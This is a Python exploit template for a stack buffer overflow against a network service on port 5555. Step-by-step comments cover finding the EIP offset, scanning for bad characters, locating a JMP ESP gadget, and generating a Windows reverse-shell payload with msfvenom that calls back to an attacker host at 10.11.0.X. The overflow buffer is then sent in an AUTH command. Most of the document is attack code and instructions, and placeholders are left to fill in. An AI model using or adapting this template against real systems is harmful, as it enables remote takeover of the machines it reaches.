import socket


HOST = ""
PORT = 5555


#step 1, find the overflow length 
#buffer = "A"*1100


#step 2, find the length to hit EIP, generate length with the following
# msf-pattern_create -l LENGTH-TO-OVERFLOW
#buffer += ""


#step 3, find offset with the following
# msf-pattern_offset -q CHARS_IN_EIP


#step 4, send extra chars to confirm if you do have control of EIP by filling it with B 
#buffer += "B"*4


#step 5, send char stack AND the Bs, delete characters that cause the stack to corrupt until you can see the Bs sent after the characters
#seeing the Bs means you have found all the bad chars

#this is the full list of characters for the initial bad scan
chars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14 \x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28 \x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c \x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50 \x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64 \x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78 \x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c \x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0 \xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4 \xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8 \xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc \xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0 \xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


#add the bad ones to the bad_char var for reference
#this is the bad char stack for reference to plug into the msfvenom payload for ease
bad_char = ("")

#buffer += chars
#buffer += "TESTSTRING"*4



#step 6, find a way to jump into ESP with !mona jmp -r ESP, set it into the var below
# remember to flip the address if coming from an x86 machine
esp_jmp = ("")

#buffer += esp_jmp


#step 7, generate shell code
#msfvenom -p windows/shell/reverse_tcp LPORT=1337 LHOST=10.11.0.X -b '\x00' -f ruby
#remember to insert the bad characters in the -b section
# TAKE NOTE OF HOW BIG YOUR SHELL CODE IS
shellcode = ()


#step 8, generate space with metasm_shell that is a little biggrt than the unpacked space of your shell code.
#not a bad idea to make it the same size as the unpacked code too
#add esp, -1650 was good in this instance
# DO NOT FLIP THIS ADDRESS!
#If you get stackoverflow errors, take the space out and put a bunch of \x90 or TESTSTRINGS in to pad.
space = ("")
#buffer += space

#step 9, pack in the shell code generated above
#buffer += shellcode

#step 10, make sure to catch with a multi/handler in msfconsole


#step 11, pack it all together like so

#buffer = "A"*1100
#buffer += esp_jmp
#buffer += space
#buffer += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)

s.send('AUTH ' + buffer + '\r\n')
s.close()
